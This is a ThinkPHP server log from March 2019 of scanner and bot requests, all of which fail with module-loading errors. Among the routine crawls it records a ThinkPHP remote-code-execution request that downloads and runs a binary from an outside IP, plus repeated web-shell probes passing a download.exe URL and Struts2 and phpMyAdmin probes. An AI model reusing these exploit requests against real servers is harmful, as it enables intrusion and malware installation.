[ 2019-03-13T00:49:07+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000108s ]
ERR: 无法加载模块:Cache

[ 2019-03-13T00:49:52+08:00 ] 71.6.167.142 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: 无法加载模块:Robots

[ 2019-03-13T00:49:55+08:00 ] 71.6.167.142 /sitemap.xml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:Sitemap

[ 2019-03-13T00:49:59+08:00 ] 71.6.167.142 /.well-known/security.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:.well-known

[ 2019-03-13T00:50:02+08:00 ] 71.6.167.142 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Favicon

[ 2019-03-13T05:13:18+08:00 ] 134.209.56.187 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F157.230.168.17%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Index

[ 2019-03-13T05:45:10+08:00 ] 203.195.207.52 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T05:45:10+08:00 ] 203.195.207.52 /FxCodeShell.jsp::$DATA
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
ERR: 无法加载模块:FxCodeShell.jsp::$DATA

[ 2019-03-13T05:45:10+08:00 ] 203.195.207.52 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T05:45:10+08:00 ] 203.195.207.52 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T06:42:03+08:00 ] 115.236.191.214 /phpmyadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Phpmyadmin

[ 2019-03-13T10:42:37+08:00 ] 123.126.113.103 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: 无法加载模块:Robots

[ 2019-03-13T11:01:28+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: 无法加载模块:Cache

[ 2019-03-13T13:56:09+08:00 ] 203.195.207.52 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T13:56:09+08:00 ] 203.195.207.52 /FxCodeShell.jsp::$DATA
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
ERR: 无法加载模块:FxCodeShell.jsp::$DATA

[ 2019-03-13T13:56:09+08:00 ] 203.195.207.52 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T13:56:09+08:00 ] 203.195.207.52 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T14:33:53+08:00 ] 203.195.207.52 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T14:33:53+08:00 ] 203.195.207.52 /FxCodeShell.jsp::$DATA
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:FxCodeShell.jsp::$DATA

[ 2019-03-13T14:33:53+08:00 ] 203.195.207.52 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T14:33:53+08:00 ] 203.195.207.52 /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-03-13T15:03:47+08:00 ] 203.208.60.46 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: 无法加载模块:Robots

[ 2019-03-13T15:45:57+08:00 ] 203.195.207.52 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T15:45:57+08:00 ] 203.195.207.52 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: 无法加载模块:Index

[ 2019-03-13T15:45:57+08:00 ] 203.195.207.52 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
ERR: 无法加载模块:Index

[ 2019-03-13T18:49:06+08:00 ] 203.195.207.52 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-03-13T18:49:06+08:00 ] 203.195.207.52 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: 无法加载模块:Index

[ 2019-03-13T18:49:06+08:00 ] 203.195.207.52 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Index

[ 2019-03-13T20:59:58+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000097s ]
ERR: 无法加载模块:Cache

